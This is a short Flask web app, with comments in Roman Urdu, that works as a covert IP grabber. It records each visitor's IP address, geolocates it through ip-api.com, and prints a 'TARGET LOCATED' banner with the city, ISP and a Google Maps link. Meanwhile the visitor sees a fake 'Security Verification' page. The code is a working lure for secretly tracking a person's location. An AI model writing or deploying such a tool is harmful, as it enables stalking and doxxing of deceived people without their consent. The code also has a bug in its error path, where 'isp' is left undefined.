from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    # Target ka IP nikalna
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    try:
        # Aik reliable service jo Karachi ka data degi
        response = requests.get(f'http://ip-api.com/json/{ip}').json()
        lat = response.get('lat')
        lon = response.get('lon')
        city = response.get('city', 'Karachi') # Default Karachi agar API slow ho
        isp = response.get('isp', 'Local ISP')
        
        # Asli Google Map link jo coordinates use kare
        if lat and lon:
            map_link = f"https://www.google.com/maps?q={lat},{lon}"
        else:
            map_link = "Coordinates fetching..."
            
    except Exception as e:
        city = "Karachi (Manual)"
        map_link = "Check Logs Again"

    print(f"\n--- [!!!] TARGET LOCATED [!!!] ---")
    print(f"IP: {ip} | City: {city} | ISP: {isp}")
    print(f"Exact Map: {map_link}\n")
    
    return "<h2>Security Verification...</h2><p>Stability check complete. Please wait for redirect.</p>"
